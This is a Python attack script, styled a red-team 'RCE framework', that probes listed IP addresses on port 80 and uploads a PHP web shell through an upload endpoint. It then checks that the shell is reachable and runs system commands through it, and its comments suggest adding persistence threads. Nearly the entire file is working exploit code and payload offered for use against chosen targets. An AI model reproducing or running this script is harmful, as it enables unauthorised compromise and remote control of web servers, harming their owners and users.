import requests
import socket
import threading
import time

# --- CONFIGURATION ---
TARGET_IPS = ['192.168.15.1'] # Add your targets here
TARGET_PORT = 80 # Common web server port
VULNERABLE_UPLOAD_PATH = '/upload.php' # Fictional vulnerable upload script

# The payload is a simple but deadly PHP web shell.
PHP_SHELL_PAYLOAD = {
    'file': ('shell.php', '<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; } ?>', 'application/octet-stream')
}
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36'
}

# --- CORE FUNCTIONS ---

def check_target(ip, port):
    """Checks if a target is online and the specified port is open."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(2) # 2-second timeout
            s.connect((ip, port))
        print(f"[+] Target {ip}:{port} is online.")
        return True
    except (socket.timeout, ConnectionRefusedError):
        print(f"[-] Target {ip}:{port} is offline or port is closed.")
        return False

def exploit_target(ip):
    """Attempts to upload the PHP web shell to the target."""
    upload_url = f"http://{ip}{VULNERABLE_UPLOAD_PATH}"
    shell_url = f"http://{ip}/shell.php"
    
    print(f"[*] Attempting to exploit {ip} via file upload...")
    try:
        response = requests.post(upload_url, files=PHP_SHELL_PAYLOAD, headers=HEADERS, timeout=5)
        if response.status_code == 200:
            # Now, check if the shell is actually accessible
            shell_check = requests.get(shell_url, headers=HEADERS, timeout=3)
            if shell_check.status_code == 200:
                print(f"[+] SUCCESS! Shell uploaded to {shell_url}")
                return shell_url
            else:
                print(f"[-] Upload seemed successful, but shell is not accessible at {shell_url}. (Status: {shell_check.status_code})")
                return None
        else:
            print(f"[-] Failed to upload shell to {ip}. (Status: {response.status_code})")
            return None
    except requests.exceptions.RequestException as e:
        print(f"[-] An error occurred during exploitation of {ip}: {e}")
        return None

def execute_command(shell_url, cmd):
    """Executes a command on a compromised target via the web shell."""
    try:
        params = {'cmd': cmd}
        response = requests.get(shell_url, params=params, headers=HEADERS, timeout=10)
        if response.status_code == 200:
            print(f"\n--- Output from {shell_url} for command '{cmd}' ---")
            print(response.text)
            print("---------------------------------------------------\n")
            return response.text
        else:
            print(f"[-] Failed to execute command on {shell_url}. (Status: {response.status_code})")
            return None
    except requests.exceptions.RequestException as e:
        print(f"[-] Error executing command on {shell_url}: {e}")
        return None

def main():
    """Main function to orchestrate the attack."""
    print("--- 0xRedTeam RCE Framework Initializing ---")
    owned_targets = []

    for ip in TARGET_IPS:
        if check_target(ip, TARGET_PORT):
            shell_url = exploit_target(ip)
            if shell_url:
                owned_targets.append(shell_url)

    if not owned_targets:
        print("\n[!] Attack run complete. No targets were compromised.")
        return

    print(f"\n[+] PWNED {len(owned_targets)} targets. Establishing command access.")
    
    # Example: Run 'uname -a' on all owned targets
    for shell in owned_targets:
        execute_command(shell, 'uname -a')
        # You could start persistence threads here if you wanted
        # For example, a thread that runs 'whoami' every 60 seconds

    print("\n--- Framework run complete. You are in control. ---")


if __name__ == "__main__":
    main()